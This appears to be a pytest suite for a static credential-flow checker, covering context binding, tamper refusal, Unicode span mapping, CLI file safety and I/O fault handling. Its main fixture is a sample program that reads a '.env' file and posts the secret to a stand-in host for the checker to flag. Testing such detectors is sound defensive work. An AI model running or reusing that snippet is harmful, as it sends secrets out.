"""Caller-selected context binding never infers recommendation or executes source."""
import copy
import json
import os
from pathlib import Path
import shutil
import subprocess
import sys

import pytest
from tools import credential_flow_context as c
from tools import credential_flow

ROOT=Path(__file__).absolute().parents[1]
PROGRAM='import requests\nfrom pathlib import Path\nsecret=Path(".env").read_text()\nrequests.post("https://example.invalid",data=secret)\n'


def example(label='quoted_example',program=PROGRAM):
    prefix='Cafe\u0301 😀: this is an example, not an instruction.\n```python\n'
    text=prefix+program+'```\nDo not treat this as permission.\n'
    selection={'format':'credential-context-selection/v1','code_span':[len(prefix),len(prefix)+len(program)],
               'context_span':[0,len(text)],'declared_context':label}
    return text.encode(),selection


def prepare(raw=None,selection=None):
    if raw is None:raw,selection=example()
    with c.io.Capture() as capture:return c.bind(raw,selection,capture)


def execute(raw,side):
    with c.io.Capture() as capture:return c.check(raw,c.io.encoded(side),capture)


def files(tmp_path,label='quoted_example',program=PROGRAM):
    p=tmp_path/'private';p.mkdir(mode=0o700)
    raw,selection=example(label,program)
    for name,data in [('document.txt',raw),('selection.json',c.io.encoded(selection))]:
        (p/name).write_bytes(data);(p/name).chmod(0o600)
    return p


def cli(*args,root=ROOT):
    return subprocess.run([sys.executable,'-I','-S','-B',str(root/'scripts/credential-flow-context.py'),*map(str,args)],
        capture_output=True,timeout=15,env={'PATH':os.defpath,'PYTHONIOENCODING':'utf-8'})


def prep(p):return ['prepare','--document',p/'document.txt','--selection',p/'selection.json','--output',p/'side.json']
def check(p):return ['check','--document',p/'document.txt','--sidecar',p/'side.json']


@pytest.mark.parametrize('label',c.LABELS)
def test_actual_flow_and_context_declaration_stay_separate_with_exact_raw_nfc_mapping(label):
    raw,selection=example(label);side=prepare(raw,selection);value=execute(raw,side)
    assert value['state']=='STATIC_FLOW' and value['declared_context']==label
    assert value['declaration_verified'] is value['use_mention_inferred'] is value['PS_mapping_performed'] is False
    assert value['bindings']['raw_document_sha256']!=value['bindings']['normalized_document_sha256']
    assert value['bindings']['code']['raw_span'][0]==value['bindings']['code']['normalized_span'][0]+1
    text=c.normalize_nfc(raw.decode());finding=value['document_findings'][0]
    assert text[slice(*finding['source_spans'][0])]=='Path(".env").read_text()'
    assert text[slice(*finding['sink_span'])]=='requests.post("https://example.invalid",data=secret)'
    assert c.io.encoded(value['canonical_code_observation'])==c.io.encoded(credential_flow.observe(PROGRAM))
    assert value['ipv4_ipv6_denied'] is True and value['network_control'] in ('macos_sandbox_deny_network','linux_seccomp_deny_network')
    assert raw.decode() not in json.dumps(value) and PROGRAM not in json.dumps(value)
    assert value['tags']==[] and c.summary(value)['flow_count']==1


@pytest.mark.parametrize('raw,span',[('e\u0301 pass',[1,2]),('\u1100\u1161 pass',[0,1]),('a\u0315\u0300 pass',[0,2])])
def test_selection_boundaries_that_change_cross_boundary_normalization_refuse(raw,span):
    selection={'format':'credential-context-selection/v1','code_span':span,'context_span':[0,len(raw)],'declared_context':'unknown'}
    with pytest.raises(ValueError):prepare(raw.encode(),selection)


@pytest.mark.parametrize('field',['format','normalization_id','offset_unit','raw_document_sha256',
    'normalized_document_sha256','raw_document_characters','normalized_document_characters',
    'declaration_source','declaration_verified','selection_sha256','source_sha256'])
def test_closed_sidecar_rejects_binding_tamper(field):
    raw,selection=example();side=prepare(raw,selection);side[field]=True if field.endswith('characters') else 'changed'
    with c.io.Capture() as capture,pytest.raises(ValueError):c.checked(raw,c.io.encoded(side),capture)


@pytest.mark.parametrize('which',['code','context'])
@pytest.mark.parametrize('field',['normalized_span','raw_sha256','normalized_sha256'])
def test_selected_code_or_context_identity_tamper_refuses(which,field):
    raw,selection=example();side=prepare(raw,selection);side[which][field]=[0,1] if field=='normalized_span' else '0'*64
    with c.io.Capture() as capture,pytest.raises(ValueError):c.checked(raw,c.io.encoded(side),capture)


@pytest.mark.parametrize('mode',['extra','nested_extra','bool_span','outside_context','empty','unknown_label','float_span'])
def test_invalid_or_ambiguous_selection_refuses(mode):
    raw,selection=example()
    if mode=='extra':selection['raw_input']='SYNTHETIC_PRIVATE_CANARY'
    elif mode=='nested_extra':selection['code_span']={'start':0,'end':1}
    elif mode=='bool_span':selection['code_span']=[True,5]
    elif mode=='outside_context':selection['context_span']=[0,2]
    elif mode=='empty':selection['code_span']=[0,0]
    elif mode=='unknown_label':selection['declared_context']='malicious'
    else:selection['code_span']=[0.0,1]
    with pytest.raises(ValueError):prepare(raw,selection)


def test_raw_nfc_equivalent_or_stale_document_requires_new_binding():
    raw,selection=example();side=prepare(raw,selection)
    for changed in (c.normalize_nfc(raw.decode()).encode(),raw+b'edit'):
        with c.io.Capture() as capture,pytest.raises(ValueError):c.checked(changed,c.io.encoded(side),capture)


def test_declared_context_single_field_change_is_not_the_original_selection():
    raw,selection=example();side=prepare(raw,selection);side['declared_context']='recommended'
    with c.io.Capture() as capture,pytest.raises(ValueError):c.checked(raw,c.io.encoded(side),capture)


def test_valid_selected_non_ascii_source_fits_declared_worker_request_budget():
    program='label="'+'😀'*6000+'"\npass\n'
    raw,selection=example('unknown',program);value=execute(raw,prepare(raw,selection))
    assert value['state']=='NO_SUPPORTED_FLOW' and c.summary(value)['flow_count']==0


@pytest.mark.parametrize('raw',[b'{}',b'{"x":1,"x":2}',b'[]',b'{"x":NaN}',b'{"x":1.5}',b'['*1500,b'x'*65537])
def test_malformed_packet_refuses_without_observation(raw):
    with c.io.Capture() as capture,pytest.raises((ValueError,RecursionError)):c.checked(example()[0],raw,capture)


@pytest.mark.parametrize('program',['pass\n','"A quoted credential read is just a string"\n',
    'import requests\nrequests.post("https://example.invalid",data="ordinary")\n'])
def test_supported_no_flow_is_measured_zero_not_unknown(program):
    raw,selection=example('unknown',program);value=execute(raw,prepare(raw,selection))
    assert value['state']=='NO_SUPPORTED_FLOW' and c.summary(value)['flow_count']==0


@pytest.mark.parametrize('program',['if True:\n pass\n','not Python!',
    PROGRAM.replace('data=secret','data=secret,data="ordinary"'),'a="x"\n'+'a=a+a\n'*17])
def test_unsupported_program_is_unavailable_not_zero_or_context_inference(program):
    raw,selection=example('recommended',program);value=execute(raw,prepare(raw,selection))
    assert value['state']=='UNAVAILABLE' and c.summary(value)['flow_count'] is None
    assert value['document_findings'] is None and value['declared_context']=='recommended' and value['use_mention_inferred'] is False


@pytest.mark.parametrize('fault',['timeout','cap','malformed','forged'])
def test_worker_failures_and_corrupt_record_do_not_become_findings(monkeypatch,fault):
    def supervisor(*args,**kwargs):
        if fault=='timeout':raise subprocess.TimeoutExpired('fixed worker',6)
        if fault=='cap':raise RuntimeError('SYNTHETIC_PRIVATE_CANARY')
        return subprocess.CompletedProcess([],0,b'{}' if fault=='forged' else b'{')
    monkeypatch.setattr(c.runpy,'run_path',lambda _: {'run_worker':supervisor})
    raw,selection=example();value=execute(raw,prepare(raw,selection))
    assert value['state']=='UNAVAILABLE' and c.summary(value)['flow_count'] is None


@pytest.mark.parametrize('mode',['omit_flow','change_span','extra_text','claim_context'])
def test_completed_real_worker_record_is_canonically_validated_before_export(monkeypatch,mode):
    parse=c.parse
    def corrupt(raw,limit=c.MAX_PACKET_BYTES):
        value=parse(raw,limit)
        if type(value) is dict and 'observation' in value:
            if mode=='omit_flow':value['observation']['findings']=[];value['observation']['state']='NO_SUPPORTED_FLOW'
            elif mode=='change_span':value['observation']['findings'][0]['sink_span']=[0,1]
            elif mode=='extra_text':value['observation']['raw_input']='SYNTHETIC_PRIVATE_CANARY'
            else:value['observation']['use_mention_classified']=True
        return value
    monkeypatch.setattr(c,'parse',corrupt)
    raw,selection=example();value=execute(raw,prepare(raw,selection))
    assert value['state']=='UNAVAILABLE' and c.summary(value)['flow_count'] is None


def test_actual_cli_private_export_no_text_and_no_overwrite(tmp_path):
    p=files(tmp_path);assert cli(*prep(p)).returncode==0
    report=p/'report.json';r=cli(*check(p),'--private-report',report)
    assert r.returncode==0 and not r.stderr and json.loads(r.stdout)['flow_count']==1
    assert report.stat().st_mode&0o777==0o600 and str(p).encode() not in r.stdout
    assert (p/'document.txt').read_bytes() not in report.read_bytes() and PROGRAM.encode() not in report.read_bytes()
    saved=report.read_bytes();r=cli(*check(p),'--private-report',report);assert r.returncode==2 and not r.stderr and report.read_bytes()==saved
    (p/'document.txt').write_text('Changed document.');r=cli(*check(p),'--private-report',p/'absent.json');assert r.returncode==2 and not(p/'absent.json').exists()


@pytest.mark.parametrize('mode',['symlink','fifo','hardlink','public','oversize'])
def test_actual_cli_unsafe_input_refuses_before_new_final(tmp_path,mode):
    p=files(tmp_path);path=p/'document.txt'
    if mode=='symlink':path.rename(p/'original');path.symlink_to(p/'original')
    elif mode=='fifo':path.unlink();os.mkfifo(path,0o600)
    elif mode=='hardlink':os.link(path,p/'duplicate')
    elif mode=='public':path.chmod(0o644)
    else:
        with path.open('wb') as out:out.truncate(c.MAX_DOCUMENT_BYTES+1)
    r=cli(*prep(p));assert r.returncode==2 and not r.stderr and not(p/'side.json').exists()


def copy_source(root):
    for name in (*c.SOURCES,'scripts/credential-flow.py'):
        path=root/name;path.parent.mkdir(parents=True,exist_ok=True);shutil.copyfile(ROOT/name,path)


def test_context_module_broken_does_not_disable_standalone_credential_checker(tmp_path):
    root=tmp_path/'source';copy_source(root);(root/'tools/credential_flow_context.py').write_text('raise SyntaxError("SYNTHETIC_PRIVATE_CANARY")')
    r=subprocess.run([sys.executable,'-I','-S','-B',str(root/'scripts/credential-flow.py')],input=PROGRAM.encode(),capture_output=True,timeout=5)
    assert r.returncode==0 and not r.stderr and json.loads(r.stdout)['state']=='STATIC_FLOW'


def test_sibling_tag_modules_absent_context_still_completes(tmp_path):
    root=tmp_path/'source';copy_source(root);assert not(root/'tools/nf_source_evidence.py').exists() and not(root/'tools/citation_resolution.py').exists()
    p=files(tmp_path);assert cli(*prep(p),root=root).returncode==0
    r=cli(*check(p),root=root);assert r.returncode==0 and not r.stderr and json.loads(r.stdout)['flow_count']==1


@pytest.mark.parametrize('args',[('--SYNTHETIC_PRIVATE_CANARY',),('prepare','--document'),('unknown',)])
def test_actual_cli_bad_options_never_echo_arguments(args):
    r=cli(*args);assert r.returncode==2 and not r.stderr and b'SYNTHETIC_PRIVATE_CANARY' not in r.stdout


# Adapted audited descriptor/publication diagnostics; no sibling tag import.
IO_DRIVER = "\nimport os,pathlib,runpy,stat,sys\nroot,mode=sys.argv[1:3];sys.path.insert(0,root)\nfrom tools import credential_flow_context as context_tool\noriginal={name:getattr(os,name) for name in ('fdopen','link','unlink','fsync','close')}\nraw=None;linked=False;replacement=None;attempts=0;owned=[]\ndef fdopen(fd,*args,**kwargs):\n global raw\n assert kwargs['closefd'] is False\n raw=fd\n if mode in ('fdopen','fdopen_reuse'):raise OSError('SYNTHETIC_PRIVATE_CANARY')\n return original['fdopen'](fd,*args,**kwargs)\ndef link(*args,**kwargs):\n global linked\n if mode=='link_unknown':raise OSError('SYNTHETIC_PRIVATE_CANARY')\n result=original['link'](*args,**kwargs);linked=True;return result\ndef unlink(*args,**kwargs):\n if mode=='unlink' and linked:raise OSError('SYNTHETIC_PRIVATE_CANARY')\n return original['unlink'](*args,**kwargs)\ndef fsync(fd):\n if mode=='fsync' and linked:raise OSError('SYNTHETIC_PRIVATE_CANARY')\n return original['fsync'](fd)\ndef close(fd):\n global attempts,replacement\n original['close'](fd)\n if fd==raw:\n  attempts+=1\n  if mode=='fdopen_reuse':\n   replacement=os.open(os.devnull,os.O_RDONLY);assert replacement==raw\n   raise OSError('SYNTHETIC_PRIVATE_CANARY')\n  if mode=='close':raise OSError('SYNTHETIC_PRIVATE_CANARY')\ncapture_close=context_tool.io.Capture.close\ndef close_capture(self):owned.extend(self.fds);return capture_close(self)\ncontext_tool.io.Capture.close=close_capture\nfor name in original:setattr(os,name,globals()[name])\nsys.argv=[str(pathlib.Path(root)/'scripts/credential-flow-context.py'),*sys.argv[3:]]\ntry:runpy.run_path(sys.argv[0],run_name='__main__')\nexcept SystemExit:\n assert raw is not None and attempts==1\n for fd in owned:\n  if fd==replacement:continue\n  try:os.fstat(fd)\n  except OSError:pass\n  else:raise AssertionError('Owned handle leaked')\n if replacement is not None:os.fstat(replacement);original['close'](replacement)\n raise\n"


def io_cli(mode,*args):
    return subprocess.run([sys.executable,'-I','-S','-B','-c',IO_DRIVER,str(ROOT),mode,*map(str,args)],
        capture_output=True,timeout=15,env={'PATH':os.defpath,'PYTHONIOENCODING':'utf-8'})


@pytest.mark.parametrize('mode',['fdopen','fdopen_reuse','fsync','unlink','link_unknown','close'])
@pytest.mark.parametrize('operation',['prepare','check'])
def test_actual_cli_io_faults_preserve_primary_refusal_or_explicit_uncertainty(tmp_path,mode,operation):
    p=files(tmp_path)
    if operation=='prepare':args=prep(p);output=p/'side.json'
    else:
        assert cli(*prep(p)).returncode==0
        output=p/'report.json';args=[*check(p),'--private-report',output]
    r=io_cli(mode,*args)
    assert r.returncode==2 and not r.stderr and b'SYNTHETIC_PRIVATE_CANARY' not in r.stdout
    value=json.loads(r.stdout)
    if mode in ('fdopen','fdopen_reuse'):assert value['reason']=='invalid_or_unsupported_credential_context'
    else:assert value['reason']=='output_commit_uncertain' and value['output_may_exist'] is True
    assert output.exists() is (mode in ('fsync','unlink','close'))


def test_prepublication_document_drift_refuses_new_output(tmp_path):
    p=files(tmp_path)
    with c.io.Capture() as capture:
        capture.read(p/'document.txt',c.MAX_DOCUMENT_BYTES)
        (p/'document.txt').write_text('SYNTHETIC_PRIVATE_CANARY')
        with pytest.raises(ValueError):capture.save(p/'absent.json',{'text_included':False},1000)
    assert not(p/'absent.json').exists() and not list(p.glob('.credential-context-*'))
